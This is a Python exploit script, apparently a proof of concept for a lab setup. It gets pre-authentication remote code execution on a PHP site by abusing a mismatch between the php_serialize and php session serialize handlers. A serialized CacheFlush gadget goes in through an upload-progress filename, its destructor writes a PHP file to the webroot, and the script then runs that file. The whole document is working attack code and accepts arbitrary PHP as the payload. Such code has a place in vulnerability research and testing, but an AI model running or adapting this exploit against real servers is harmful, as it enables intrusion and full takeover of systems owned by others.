#!/usr/bin/env python3
# Pre-auth RCE over HTTP via session serialize-handler confusion.
# Delivery: session.upload_progress writes our bytes (the upload filename) into
# the session file using the php_serialize handler (producer path). A second
# path reads the same session with the default `php` handler; the `|` we embed
# splits the record so the tail is unserialized into a CacheFlush object whose
# __destruct writes a PHP file to the webroot. No LFI, no file planting.
import argparse
import sys
import urllib.request


def serialize_gadget(drop_path, php_body):
    obj = (f'O:10:"CacheFlush":2:'
           f'{{s:9:"cacheFile";s:{len(drop_path)}:"{drop_path}";'
           f's:4:"html";s:{len(php_body)}:"{php_body}";}}')
    return "|" + obj  # leading | gives the php-handler reader its split point


def multipart(progress_name, filename):
    b = "----b0undary"
    # escape " as \" so PHP stores real quotes in the saved filename
    fn = filename.replace('"', '\\"')
    body = "\r\n".join([
        f"--{b}",
        f'Content-Disposition: form-data; name="{progress_name}"', '', 'x',
        f"--{b}",
        f'Content-Disposition: form-data; name="f"; filename="{fn}"', '', 'A' * 8,
        f"--{b}--", '',
    ]).encode()
    return b, body


def post(url, body, boundary, sid):
    r = urllib.request.Request(url, data=body, method="POST", headers={
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Cookie": f"PHPSESSID={sid}"})
    return urllib.request.urlopen(r, timeout=15).read().decode(errors="replace")


def get(url, sid):
    r = urllib.request.Request(url, headers={"Cookie": f"PHPSESSID={sid}"})
    return urllib.request.urlopen(r, timeout=15).read().decode(errors="replace")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="http://127.0.0.1:18080")
    ap.add_argument("--producer", default="/ps/up.php", help="php_serialize path")
    ap.add_argument("--consumer", default="/session_probe.php?action=show", help="php handler path")
    ap.add_argument("--sid", default="hcdemo")
    ap.add_argument("--drop", default="/var/www/html/data/hc_rce.php")
    ap.add_argument("--web-drop", default="/data/hc_rce.php")
    ap.add_argument("--php", help="PHP to execute (default: a benign whoami/host banner)")
    args = ap.parse_args()

    php_body = args.php or "<?php echo 'RCE-OK '.get_current_user().' '.php_uname('n');?>"
    payload = serialize_gadget(args.drop, php_body)
    boundary, body = multipart("PHP_SESSION_UPLOAD_PROGRESS", payload)

    print("[*] gadget in filename:", payload)
    print("[1] deliver via producer (php_serialize):",
          post(args.base + args.producer, body, boundary, args.sid).strip())
    print("[2] trigger via consumer (php handler) ...")
    get(args.base + args.consumer, args.sid)
    print("[3] execute dropped file:")
    out = get(args.base + args.web_drop, args.sid)
    print(out.rstrip())
    ok = bool(out) and "File not found" not in out
    print("\n[+] RCE achieved" if ok else "\n[-] no code execution (payload did not deserialize)")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
